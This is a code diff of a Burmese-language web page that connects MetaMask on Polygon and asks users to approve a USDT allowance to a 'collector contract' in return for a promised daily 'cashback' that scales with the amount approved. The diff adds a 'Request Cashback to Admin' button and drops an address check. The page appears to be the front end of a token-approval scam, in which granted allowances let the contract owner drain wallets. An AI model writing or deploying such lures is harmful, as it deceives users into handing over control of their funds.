@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT Approval & Cashback</title>
+    <title>USDT Approval & Cashback Request</title>
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
 </head>
@@ -33,16 +33,13 @@
             </button>
         </div>
 
-        <!-- Approve ပြီးမှသာ ပေါ်လာမည့် Cashback Rate နှင့် Dashboard (Default: hidden) -->
+        <!-- Approve ပြီးမှသာ ပေါ်လာမည့် Cashback Dashboard နှင့် Request Button -->
         <div id="cashbackSection" class="hidden mt-6 space-y-4">
-            <!-- Live Cashback Rate Banner -->
             <div class="bg-slate-900/80 border border-emerald-500/40 p-3 rounded-xl text-center">
                 <span class="text-xs text-slate-400">သင့်အတွက် Cashback နှုန်းထား: </span>
                 <span id="liveRateDisplay" class="text-sm font-bold text-emerald-400">0.05% Daily</span>
-                <span class="text-xs text-slate-400"> (30 Days Limit)</span>
             </div>
 
-            <!-- Active Cashback Dashboard -->
             <div class="bg-slate-900 border border-slate-700 p-4 rounded-xl space-y-2">
                 <h2 class="text-xs font-bold text-emerald-400 uppercase tracking-wider mb-2">✨ Your Active Cashback Dashboard</h2>
                 <div class="flex justify-between text-xs text-slate-300">
@@ -50,14 +47,15 @@
                     <span id="userAllowanceVal" class="font-mono text-white font-semibold">0 USDT</span>
                 </div>
                 <div class="flex justify-between text-xs text-slate-300">
-                    <span>နေ့စဉ် ရရှိမည့် Cashback:</span>
-                    <span id="userLiveDailyCb" class="font-mono text-amber-300 font-semibold">0.00 USDT</span>
-                </div>
-                <div class="flex justify-between text-xs text-slate-300 border-t border-slate-800 pt-1">
-                    <span>တစ်လစာ (30 Days):</span>
+                    <span>တောင်းဆိုနိုင်သော တစ်လစာ (30 Days):</span>
                     <span id="userLiveMonthlyCb" class="font-mono text-emerald-400 font-semibold">0.00 USDT</span>
                 </div>
             </div>
+
+            <!-- Request Cashback Button -->
+            <button onclick="requestCashback()" class="w-full bg-amber-600 hover:bg-amber-500 font-semibold py-2.5 px-4 rounded-xl transition cursor-pointer text-sm">
+                Request Cashback to Admin
+            </button>
         </div>
 
         <div id="statusLog" class="mt-4 text-xs text-center text-amber-400 font-mono"></div>
@@ -66,6 +64,7 @@
     <script>
         let provider, signer, userAddress;
         let currentDailyRatePct = 0.05;
+        let calculatedMonthlyCb = 0;
 
         const POLYGON_CHAIN_ID = "0x89";
         const USDT_POLYGON_ADDRESS = "0xc2132d05d31c914a87c6611c10748aeb04b58e2f";
@@ -77,17 +76,16 @@
         ];
 
         const COLLECTOR_ABI = [
-            "function dailyRate() view returns (uint256)"
+            "function dailyRate() view returns (uint256)",
+            "function requestCashback(uint256 amount) external"
         ];
 
         async function fetchLiveRate() {
             try {
                 const readProvider = new ethers.JsonRpcProvider("https://polygon-rpc.com/");
                 const collectorContract = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, readProvider);
-                
                 const rateFromContract = await collectorContract.dailyRate(); 
                 currentDailyRatePct = Number(rateFromContract) / 100;
-                
                 document.getElementById("liveRateDisplay").innerText = `${currentDailyRatePct}% Daily`;
             } catch (err) {
                 console.error("Rate fetching error:", err);
@@ -99,7 +97,6 @@
                 alert("MetaMask ကို Install လုပ်ပါ။");
                 return;
             }
-
             try {
                 provider = new ethers.BrowserProvider(window.ethereum);
                 const accounts = await provider.send("eth_requestAccounts", []);
@@ -116,9 +113,6 @@
                 document.getElementById("connectBtn").classList.replace("bg-blue-600", "bg-slate-700");
                 document.getElementById("approveBtn").removeAttribute("disabled");
                 
-                document.getElementById("statusLog").innerText = "Polygon Network သို့ ချိတ်ဆက်ပြီးပါပြီ။";
-                
-                // ချိတ်ဆက်ပြီးပါက ယခင်က Approve ပေးထားမှု ရှိမရှိ စစ်ဆေးမည်
                 checkUserActiveAllowance();
             } catch (error) {
                 console.error(error);
@@ -133,16 +127,14 @@
                 const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
                 const formattedAllowance = ethers.formatUnits(allowance, 6);
 
-                // Allowance ရှိမှသာ (Approve ပြီးမှသာ) Cashback Section ကို ပြသမည်
                 if (Number(formattedAllowance) > 0) {
                     document.getElementById("cashbackSection").classList.remove("hidden");
                     document.getElementById("userAllowanceVal").innerText = `${formattedAllowance} USDT`;
 
                     const dailyCb = Number(formattedAllowance) * (currentDailyRatePct / 100);
-                    const monthlyCb = dailyCb * 30;
+                    calculatedMonthlyCb = dailyCb * 30;
 
-                    document.getElementById("userLiveDailyCb").innerText = `${dailyCb.toFixed(4)} USDT`;
-                    document.getElementById("userLiveMonthlyCb").innerText = `${monthlyCb.toFixed(4)} USDT`;
+                    document.getElementById("userLiveMonthlyCb").innerText = `${calculatedMonthlyCb.toFixed(4)} USDT`;
                 } else {
                     document.getElementById("cashbackSection").classList.add("hidden");
                 }
@@ -152,14 +144,15 @@
         }
 
         async function approveUSDT() {
+            // သတိပေးချက် Box ပြသခြင်း
+            const isConfirmed = confirm("ဤလုပ်ဆောင်ချက်သည် approve ပေးသောလုပ်ဆောင်ချက်ဖြစ်ပြီး ဆက်လက်လုပ်ဆောင်လိုပါက OK ကိုနှိပ်ပါ။");
+            if (!isConfirmed) {
+                return; // Cancel နှိပ်ပါက ဆက်မလုပ်တော့ဘဲ ရပ်တန့်မည်
+            }
+
             const rawAmount = document.getElementById("amount").value.trim();
             const logElement = document.getElementById("statusLog");
             const spender = COLLECTOR_CONTRACT_ADDRESS.trim();
-
-            if (!ethers.isAddress(spender)) {
-                alert("Contract Address မှန်ကန်မှု မရှိပါ။");
-                return;
-            }
 
             if (!rawAmount || isNaN(rawAmount) || Number(rawAmount) <= 0) {
                 alert("မှန်ကန်သော USDT ပမာဏ ထည့်ပါ။");
@@ -176,12 +169,26 @@
 
                 const receipt = await tx.wait();
                 logElement.innerText = `အောင်မြင်ပါသည်! Block: ${receipt.blockNumber}`;
-
-                // Approve လုပ်ပြီးစီးသည်နှင့် နှုန်းထားနှင့် Dashboard ပေါ်လာစေရန် စစ်ဆေးမည်
                 checkUserActiveAllowance();
             } catch (error) {
                 console.error(error);
                 logElement.innerText = `Approval ပျက်ပြားသွားပါပြီ: ${error.reason || error.message}`;
+            }
+        }
+
+        async function requestCashback() {
+            const logElement = document.getElementById("statusLog");
+            try {
+                logElement.innerText = "Cashback တောင်းဆိုချက် ပို့နေပါသည်...";
+                const collectorContract = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
+                const parsedAmount = ethers.parseUnits(calculatedMonthlyCb.toFixed(6), 6);
+
+                const tx = await collectorContract.requestCashback(parsedAmount);
+                await tx.wait();
+                logElement.innerText = "Cashback တောင်းဆိုမှု Admin ဆီသို့ အောင်မြင်စွာ ပို့ပြီးပါပြီ!";
+            } catch (err) {
+                console.error(err);
+                logElement.innerText = "တောင်းဆိုမှု မအောင်မြင်ပါ။";
             }
         }
     </script>
